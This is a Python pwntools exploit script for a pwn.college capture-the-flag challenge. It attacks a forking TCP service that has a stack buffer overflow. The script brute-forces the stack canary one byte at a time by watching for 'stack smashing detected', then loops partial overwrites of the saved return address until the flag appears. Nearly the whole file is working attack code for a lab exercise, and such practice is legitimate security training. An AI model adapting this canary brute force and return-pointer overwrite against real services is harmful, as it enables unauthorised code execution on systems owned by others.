from pwn import *
import random
import time

'''
this challenge launch a tcp server that will server for any tcp connection by fork() a child process.
In that child challenge() got called and there is a buffer overflow

NOTE: the canary is not changed within the service.

We can brust-force the canary, only 7 bytes, the last byte always zero.
'''

if args.LOCAL:
    context.binary = elf = ELF('./fork-foolery-hard')
else:
    context.binary = elf = ELF('/challenge/fork-foolery-hard')

server = elf.process()

canary_buffer_offset = 0x28
sip_buffer_offset = 0x38
fixed_byte = b'\x45'
guess_byte = [bytes([i]) for i in range(0x00, 0x100, 0x10)]

def send_payload(target, payload):
    target.sendline(f'{len(payload)}'.encode())
    target.send(payload)        # NOTE: should send() not sendline(), the later will cause bug when that byte of canary is b'\x0a'

def bruteforce_canary():
    canary = b'\x00'
    start_time = time.time()
    while len(canary) < 8:
        for byte in range(0x0, 0xff):
            target = remote('127.0.0.1', 1337)
            send_payload(target, b'A' * canary_buffer_offset + canary + bytes([byte]))

            response = target.recvall(timeout=5)

            if b'stack smashing detected' not in response:
                canary += bytes([byte])
                print(f"[++++++] get new byte of canary: {hex(u64(canary.rjust(8, b'\x00')))} [++++++]")
                break       # guess this byte of canary successful, break to next one

    end_time = time.time()
    elapsed_time = end_time - start_time
    print(f'[+] Brute force canary: {hex(u64(canary))} in {elapsed_time:.2f} seconds')
    return canary

canary = bruteforce_canary()

while True:
    with remote('127.0.0.1', 1337) as target:
        target.sendline(str(sip_buffer_offset + 2).encode())
        target.sendline(b'A' * canary_buffer_offset + canary + b'B' * 8 + fixed_byte + random.choice(guess_byte))

        response = target.recvall()

        if b'pwn.college' in response:
            print(response.decode())
            exit()
